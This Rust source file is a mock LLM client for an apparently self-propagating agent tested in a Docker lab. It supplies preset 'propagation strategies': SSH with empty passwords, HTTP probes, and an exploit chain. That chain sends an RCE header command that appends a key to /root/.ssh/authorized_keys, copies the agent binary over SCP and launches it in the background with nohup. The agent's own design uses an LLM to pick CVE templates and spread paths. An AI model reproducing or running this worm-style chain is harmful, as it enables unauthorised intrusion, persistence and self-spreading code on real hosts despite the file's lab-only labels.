use std::sync::Arc;

use crate::{
    client::{QueryFuture, TemplateFuture},
    types::{
        ArtifactType, DiscoveryQuery, PropagationMethod, PropagationStrategy,
        TemplateSelectionQuery, TemplateSelectionResponse,
    },
    types::{BootstrapPlan, BootstrapStep, ExpectedResult},
    LlmClient,
};

/// Deterministic LLM client for testing and Docker Lab validation.
///
/// Returns a preset `PropagationStrategy` on every `query_propagation` call.
/// For `select_templates`, returns all templates whose tags include 'rce' or 'cve*'
/// — matching the static `PHYSARUM_TEMPLATE_TAGS=rce,cve` filter behaviour so that
/// dry-runs produce the same result as the current tag-filtered approach.
///
/// No network, no API key, no external dependency. Used in:
///   - unit and integration tests
///   - Docker Lab dry-runs where a real LLM endpoint is not available
///   - CI runs
///
/// # Ephemeral pubkey substitution
///
/// `exploit_rce_ssh_first` stores the sentinel `__EPHEMERAL_PUBKEY__` in the
/// HttpPost header rather than a real key. When `uses_ephemeral_pubkey` is true,
/// `query_propagation` replaces the sentinel with `query.ephemeral_pubkey` at
/// call time so the real ephemeral key — generated just before the query — is
/// what gets written into the target's `authorized_keys` via the RCE step.
///
/// Without this substitution the SCP step would fail: the target would have a
/// placeholder in `authorized_keys` while host-a holds a different private key.
pub struct MockLlmClient {
    strategy: Arc<PropagationStrategy>,
    /// When true, query_propagation replaces __EPHEMERAL_PUBKEY__ in every
    /// HttpPost header value with query.ephemeral_pubkey before returning.
    uses_ephemeral_pubkey: bool,
}

const EPHEMERAL_PUBKEY_SENTINEL: &str = "__EPHEMERAL_PUBKEY__";

impl MockLlmClient {
    pub fn new(strategy: PropagationStrategy) -> Self {
        Self {
            strategy: Arc::new(strategy),
            uses_ephemeral_pubkey: false,
        }
    }

    /// Returns `PropagationMethod::NoPath` — simulates a target the LLM
    /// cannot find a propagation path to.
    pub fn no_path(reason: impl Into<String>) -> Self {
        Self::new(PropagationStrategy {
            method: PropagationMethod::NoPath {
                reason: reason.into(),
            },
            artifact_type: ArtifactType::None,
            bootstrap_plan: None,
            confidence: 1.0,
            reasoning_summary: "Mock: no propagation path available.".into(),
            preconditions: vec![],
            validation_check: None,
            safety_notes: vec!["Mock client — lab use only.".into()],
        })
    }

    /// Returns an SSH strategy targeting `user` with empty-password auth.
    pub fn ssh_empty_password(user: impl Into<String>, confidence: f32) -> Self {
        let u = user.into();
        Self::new(PropagationStrategy {
            method: PropagationMethod::Ssh {
                user: u.clone(),
                auth: crate::types::SshAuth::EmptyPassword,
            },
            artifact_type: ArtifactType::AgentBinary,
            bootstrap_plan: None,
            confidence,
            reasoning_summary: format!("Mock: SSH empty-password attempt as user '{u}'."),
            preconditions: vec!["Port 22 open".into()],
            validation_check: Some("SSH connection succeeds".into()),
            safety_notes: vec!["Mock client — lab use only.".into()],
        })
    }

    /// Returns an HTTP strategy for a given path (no bootstrap plan).
    pub fn http_get(path: impl Into<String>, confidence: f32) -> Self {
        let p = path.into();
        Self::new(PropagationStrategy {
            method: PropagationMethod::Http {
                path: p.clone(),
                http_method: crate::types::HttpMethod::Get,
                headers: vec![],
                port: None,
            },
            artifact_type: ArtifactType::HttpRequest,
            bootstrap_plan: None,
            confidence,
            reasoning_summary: format!("Mock: HTTP GET {p}."),
            preconditions: vec!["Port 80 or 8080 open".into()],
            validation_check: Some("HTTP 200 response".into()),
            safety_notes: vec!["Mock client — lab use only.".into()],
        })
    }

    /// Returns an Exploit strategy for any confirmed RCE CVE — SSH-first delivery.
    ///
    /// Used by `--llm-endpoint mock-exploit:<port>:<user>` for Phase 2 dry-run:
    ///   Step 1 — HttpPost: RCE payload plants the ephemeral pubkey in authorized_keys.
    ///   Step 2 — ScpUpload: transfers physarum-maze binary via SSH (ephemeral key).
    ///   Step 3 — SshCommand: executes binary with nohup in background.
    ///
    /// The HttpPost header uses the sentinel `__EPHEMERAL_PUBKEY__` at construction
    /// time. `query_propagation` replaces it with `query.ephemeral_pubkey` at call
    /// time so the key written to `authorized_keys` matches the private key that
    /// the executor will use for the subsequent SCP and SSH steps.
    ///
    /// `target_port` is the HTTP port of the vulnerable service (e.g. 8080 for Struts).
    pub fn exploit_rce_ssh_first(
        target_port: u16,
        remote_user: impl Into<String>,
        confidence: f32,
    ) -> Self {
        let user = remote_user.into();

        // Sentinel substituted at query_propagation time with the real ephemeral pubkey.
        let pubkey_cmd = format!(
            "mkdir -p /root/.ssh && chmod 700 /root/.ssh \
             && echo '{EPHEMERAL_PUBKEY_SENTINEL}' >> /root/.ssh/authorized_keys \
             && chmod 600 /root/.ssh/authorized_keys"
        );

        Self {
            uses_ephemeral_pubkey: true,
            strategy: Arc::new(PropagationStrategy {
                method: crate::types::PropagationMethod::Exploit {
                    cve: "CVE-MOCK-RCE".into(),
                },
                artifact_type: ArtifactType::AgentBinary,
                bootstrap_plan: Some(BootstrapPlan {
                    steps: vec![
                        // Step 1: plant pubkey via RCE — sentinel replaced at query time
                        BootstrapStep {
                            action: crate::types::BootstrapAction::HttpPost {
                                path: "/exploit".into(),
                                body: String::new(),
                                port: Some(target_port),
                                headers: vec![("X-Rce-Cmd".into(), pubkey_cmd)],
                                accept_any_response: true,
                            },
                            target: String::new(),
                            timeout_ms: 10_000,
                            requires_root: false,
                            expected_result: ExpectedResult {
                                success_indicator: "RCE fired — pubkey planted".into(),
                                failure_indicator: Some("Connection refused or timeout".into()),
                            },
                        },
                        // Step 2: SCP the binary (executor uses ephemeral key automatically)
                        BootstrapStep {
                            action: crate::types::BootstrapAction::ScpUpload {
                                local_path: "__self__".into(),
                                remote_path: "/tmp/physarum/physarum-maze".into(),
                                user: Some(user.clone()),
                            },
                            target: String::new(),
                            timeout_ms: 15_000,
                            requires_root: false,
                            expected_result: ExpectedResult {
                                success_indicator: "SCP exit 0".into(),
                                failure_indicator: Some("SCP error".into()),
                            },
                        },
                        // Step 3: execute in background
                        BootstrapStep {
                            action: crate::types::BootstrapAction::SshCommand {
                                command:
                                    "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze \
                                         && nohup /tmp/physarum/physarum-maze --mode propagated \
                                            >/tmp/physarum/agent.log 2>&1 &"
                                        .into(),
                                user: Some(user.clone()),
                            },
                            target: String::new(),
                            timeout_ms: 10_000,
                            requires_root: false,
                            expected_result: ExpectedResult {
                                success_indicator: "SSH exit 0".into(),
                                failure_indicator: Some("SSH error".into()),
                            },
                        },
                    ],
                }),
                confidence,
                reasoning_summary: format!(
                    "Mock: RCE → pubkey injection → SCP binary (user={user}) → nohup exec via SSH."
                ),
                preconditions: vec![
                    "HTTP port open (vulnerable service)".into(),
                    "Port 22 open (sshd running on target)".into(),
                    "RCE confirmed by CVE template".into(),
                ],
                validation_check: Some("/tmp/physarum/physarum-maze running on target".into()),
                safety_notes: vec![
                    "Mock exploit client — Docker Lab Phase 2 only.".into(),
                    "RCE + SSH access — isolated lab environment only.".into(),
                ],
            }),
        }
    }

    /// Returns an HTTP strategy WITH a real bootstrap plan (HttpGet step).
    ///
    /// Used by `--llm-endpoint mock-http[:<port>]` in the Docker Lab to prove the full
    /// pipeline end-to-end without a real LLM. The executor performs a real HTTP
    /// GET against the target so Container B must be reachable on the specified port.
    /// `port` defaults to 80 when None; pass 8080 for Struts/Jetty targets.
    pub fn http_probe_with_plan(
        path: impl Into<String>,
        port: Option<u16>,
        confidence: f32,
    ) -> Self {
        let p = path.into();
        let port_label = port.map(|p| p.to_string()).unwrap_or_else(|| "80".into());
        Self::new(PropagationStrategy {
            method: PropagationMethod::Http {
                path: p.clone(),
                http_method: crate::types::HttpMethod::Get,
                headers: vec![],
                port,
            },
            artifact_type: ArtifactType::HttpRequest,
            bootstrap_plan: Some(BootstrapPlan {
                steps: vec![BootstrapStep {
                    action: crate::types::BootstrapAction::HttpGet {
                        path: p.clone(),
                        port,
                    },
                    target: String::new(), // filled at runtime from target IP
                    timeout_ms: 5_000,
                    requires_root: false,
                    expected_result: ExpectedResult {
                        success_indicator: "HTTP 200".into(),
                        failure_indicator: Some("HTTP 4xx/5xx or timeout".into()),
                    },
                }],
            }),
            confidence,
            reasoning_summary: format!(
                "Mock HTTP probe: GET {p}:{port_label} — Docker Lab cycle validation."
            ),
            preconditions: vec![format!("Port {port_label} open")],
            validation_check: Some(format!("HTTP 200 from target:{port_label}")),
            safety_notes: vec!["Mock client — Docker Lab only.".into()],
        })
    }
}

impl LlmClient for MockLlmClient {
    fn select_templates<'a>(&'a self, query: &'a TemplateSelectionQuery) -> TemplateFuture<'a> {
        // Mock selection: return all templates with rce or cve* tags.
        // This replicates the static PHYSARUM_TEMPLATE_TAGS=rce,cve filter
        // so dry-runs produce consistent results.
        let selected_ids: Vec<String> = query
            .available_templates
            .iter()
            .filter(|t| {
                t.tags.iter().any(|tag| {
                    let t = tag.to_ascii_lowercase();
                    t == "rce" || t.starts_with("cve")
                }) || t.id.starts_with("CVE-")
            })
            .map(|t| t.id.clone())
            .collect();

        let count = selected_ids.len();
        Box::pin(async move {
            Ok(TemplateSelectionResponse {
                selected_ids,
                reasoning: format!("Mock: selected {count} rce/cve templates from catalog."),
            })
        })
    }

    fn query_propagation<'a>(&'a self, query: &'a DiscoveryQuery) -> QueryFuture<'a> {
        let strategy = Arc::clone(&self.strategy);
        let pubkey = if self.uses_ephemeral_pubkey {
            query.ephemeral_pubkey.clone()
        } else {
            None
        };
        Box::pin(async move {
            let Some(real_pubkey) = pubkey else {
                return Ok((*strategy).clone());
            };
            // Substitute the sentinel in every HttpPost header value.
            let mut s = (*strategy).clone();
            if let Some(ref mut plan) = s.bootstrap_plan {
                for step in &mut plan.steps {
                    if let crate::types::BootstrapAction::HttpPost { ref mut headers, .. } =
                        step.action
                    {
                        for (_, v) in headers.iter_mut() {
                            if v.contains(EPHEMERAL_PUBKEY_SENTINEL) {
                                *v = v.replace(EPHEMERAL_PUBKEY_SENTINEL, &real_pubkey);
                            }
                        }
                    }
                }
            }
            Ok(s)
        })
    }
}
